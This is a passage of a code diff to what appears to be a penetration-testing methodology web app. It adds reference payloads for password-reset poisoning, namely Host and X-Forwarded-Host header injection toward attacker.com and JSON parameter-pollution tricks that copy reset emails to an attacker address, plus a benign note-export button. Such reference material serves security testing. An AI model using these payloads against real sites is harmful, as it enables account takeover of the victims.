+        'Content-Type: application/x-www-form-urlencoded\n\n' +
+        'email=victim@victim.com\n\n' +
+        '# Inject attacker-controlled host to poison reset link\n' +
+        'POST /account/reset-password HTTP/1.1\n' +
+        'Host: attacker.com\n' +
+        'Content-Type: application/x-www-form-urlencoded\n\n' +
+        'email=victim@victim.com\n\n' +
+        '# Double Host header bypass\n' +
+        'Host: TARGET\n' +
+        'Host: attacker.com\n\n' +
+        '# X-Forwarded-Host bypass\n' +
+        'Host: TARGET\n' +
+        'X-Forwarded-Host: attacker.com\n\n' +
+        '# Other headers to try:\n' +
+        '# X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded'
+      ));
+      frag.appendChild(subHost);
+
+      const subJson = createSubsection('JSON Parameter Pollution for Reset Emails');
+      subJson.appendChild(createCodeBlock('http',
+        '# Original request\n' +
+        'POST /api/reset-password HTTP/1.1\n' +
+        'Content-Type: application/json\n\n' +
+        '{"email":"victim@victim.com"}\n\n' +
+        '# JSON array injection — app may send reset to all addresses in array\n' +
+        '{"email":["victim@victim.com","attacker@attacker.com"]}\n\n' +
+        '# Duplicate key — depends on parser (last or first wins)\n' +
+        '{"email":"victim@victim.com","email":"attacker@attacker.com"}\n\n' +
+        '# Carbon copy via separator\n' +
+        '{"email":"victim@victim.com,attacker@attacker.com"}\n' +
+        '{"email":"victim@victim.com%20attacker@attacker.com"}\n' +
+        '{"email":"victim@victim.com|attacker@attacker.com"}\n\n' +
+        '# Newline injection in email field\n' +
+        '{"email":"victim@victim.com\\nCc: attacker@attacker.com"}'
+      ));
+      frag.appendChild(subJson);
+
+      body.appendChild(frag);
+    }
+  }
 }
 
 // ==================== Init ====================
@@ -874,6 +1599,33 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     btnRow.appendChild(clearBtn);
+
+    const exportBtn = document.createElement('button');
+    exportBtn.className = 'btn btn-blue';
+    exportBtn.textContent = '📥 Export Notes';
+    exportBtn.addEventListener('click', () => {
+      const parts = [];
+      document.querySelectorAll('.section-notes textarea').forEach(ta => {
+        if (!ta.value.trim()) return;
+        const sec = ta.closest('.methodology-section');
+        const titleEl = sec ? sec.querySelector('.section-title') : null;
+        const title = titleEl ? titleEl.textContent : 'Section';
+        parts.push('== ' + title + ' ==\n\n' + ta.value.trim() + '\n\n---\n\n');
+      });
+      if (!parts.length) {
+        showToast('📝 No notes to export!');
+        return;
+      }
+      const blob = new Blob([parts.join('')], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'RV_U_Notes.txt';
+      a.click();
+      URL.revokeObjectURL(url);
+    });
+    btnRow.appendChild(exportBtn);
+
     container.appendChild(btnRow);
   }
 });
